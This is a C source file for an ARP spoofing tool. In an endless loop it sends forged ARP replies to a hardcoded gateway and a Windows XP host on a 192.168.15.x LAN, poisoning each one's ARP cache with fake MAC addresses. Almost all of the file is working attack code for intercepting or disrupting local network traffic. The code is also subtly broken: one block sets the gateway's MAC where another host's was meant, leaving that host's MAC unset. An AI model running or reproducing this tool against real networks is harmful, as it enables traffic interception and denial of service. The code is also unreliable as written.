#include <stdio.h>  
#include <stdlib.h>  
#include <unistd.h>  
#include <string.h>  
#include <net/ethernet.h>  
#include <netinet/if_ether.h>  
#include <netinet/in.h>  
#include <arpa/inet.h>  
#include <sys/socket.h>  
#include <memory.h>
 
//#define SRC_IP "192.168.15.254"  
//#define TARGET_IP "192.168.15.55"  
  
//short SRC_MAC[]={0x01,0x22,0xa1,0x08,0xf4,0x05};    /* latele */  
//short TARGET_MAC[]={0x00,0x27,0x13,0xb4,0x6e,0x08};  

typedef struct {
	unsigned char ip[16];
	short mac[6];
}apt_t;
  
void send_arp_reply(apt_t src, apt_t target)  
{  
    struct ether_header *eth_hdr;  
    struct ether_arp *arp;  
    char datagram[60];  
    eth_hdr=(struct ether_header *)datagram;  
    memset(datagram,0,sizeof(datagram));  

	
	
  
    //set the ethernet header  
    eth_hdr->ether_dhost[0]=target.mac[0];//TARGET_MAC[0];  
    eth_hdr->ether_dhost[1]=target.mac[1];//TARGET_MAC[1];  
    eth_hdr->ether_dhost[2]=target.mac[2];//TARGET_MAC[2];  
    eth_hdr->ether_dhost[3]=target.mac[3];//TARGET_MAC[3];  
    eth_hdr->ether_dhost[4]=target.mac[4];//TARGET_MAC[4];  
    eth_hdr->ether_dhost[5]=target.mac[5];//TARGET_MAC[5];  
  
    eth_hdr->ether_shost[0]=src.mac[0];//SRC_MAC[0];  
    eth_hdr->ether_shost[1]=src.mac[1];//SRC_MAC[1];  
    eth_hdr->ether_shost[2]=src.mac[2];//SRC_MAC[2];  
    eth_hdr->ether_shost[3]=src.mac[3];//SRC_MAC[3];  
    eth_hdr->ether_shost[4]=src.mac[4];//SRC_MAC[4];  
    eth_hdr->ether_shost[5]=src.mac[5];//SRC_MAC[5];  
  
    eth_hdr->ether_type=htons(ETHERTYPE_ARP);    // 0x0806  
  
    //set the arp header  
    arp=(struct ether_arp*)(datagram+sizeof(struct ether_header));  
    arp->arp_hrd=htons(ARPHRD_ETHER);  
    arp->arp_pro=htons(ETHERTYPE_IP);  
    arp->arp_hln=6;  
    arp->arp_pln=4;  
    arp->arp_op=htons(ARPOP_REPLY);  
  
    //arp body  
    //sender MAC and IP  
    memcpy((void*)arp->arp_sha,(void*)eth_hdr->ether_shost,6);  
    struct in_addr inadd_sender;  
    //inet_aton(SRC_IP,&inadd_sender);  
    inet_aton(src.ip,&inadd_sender); 
    memcpy((void*)arp->arp_spa,(void*)&inadd_sender,4);  
  
    //target MAC and IP  
    memcpy((void*)arp->arp_tha,(void*)eth_hdr->ether_dhost,6);  
    struct in_addr inadd_target;  
    //inet_aton(TARGET_IP,&inadd_target);  
    inet_aton(target.ip,&inadd_target);  
    memcpy((void *)arp->arp_tpa,(void*)&inadd_target,4);  
  
    //establish socket  
    int fd=socket(AF_INET,SOCK_PACKET,htons(ETH_P_ARP));  
    if(fd<0)  
    {  
        perror("socket");  
        exit(-1);  
    }  
    struct sockaddr sa;  
    strcpy(sa.sa_data,"eth1");  
    sendto(fd,datagram,sizeof(datagram),0,&sa,sizeof(sa));  
  
    close(fd);  
}  
  
int main(void)  
{  
	apt_t my1, my2, winxp, gateway;
	memset(winxp.ip, 0, sizeof(winxp));
	memcpy(winxp.ip, "192.168.15.55", strlen("192.168.15.55"));
	winxp.mac[0] = 0x00;
	winxp.mac[1] = 0x27;
	winxp.mac[2] = 0x13;
	winxp.mac[3] = 0xb4;
	winxp.mac[4] = 0x6e;
	winxp.mac[5] = 0x08;

	memset(gateway.ip, 0, sizeof(gateway));
	memcpy(gateway.ip, "192.168.15.254", strlen("192.168.15.254"));
	gateway.mac[0] = 0x00;
	gateway.mac[1] = 0x22;
	gateway.mac[2] = 0xa1;
	gateway.mac[3] = 0x08;
	gateway.mac[4] = 0xf4;
	gateway.mac[5] = 0x04;

	memset(my1.ip, 0, sizeof(my1));
	memcpy(my1.ip, "192.168.15.55", strlen("192.168.15.55"));
	my1.mac[0] = 0x00;
	my1.mac[1] = 0x01;
	my1.mac[2] = 0x02;
	my1.mac[3] = 0x05;
	my1.mac[4] = 0x06;
	my1.mac[5] = 0x01;

	memset(my2.ip, 0, sizeof(my2));
	memcpy(my2.ip, "192.168.15.254", strlen("192.168.15.254"));
	gateway.mac[0] = 0x02;
	gateway.mac[1] = 0x05;
	gateway.mac[2] = 0x08;
	gateway.mac[3] = 0x04;
	gateway.mac[4] = 0x23;
	gateway.mac[5] = 0x01;
	
	
    while(1)  
    {  
        printf("send arp reply...\n");  
        send_arp_reply(my1, gateway);  
        usleep(1000);
		send_arp_reply(my2, winxp); 
		usleep(1000);
    }  
    return 0;  
} 

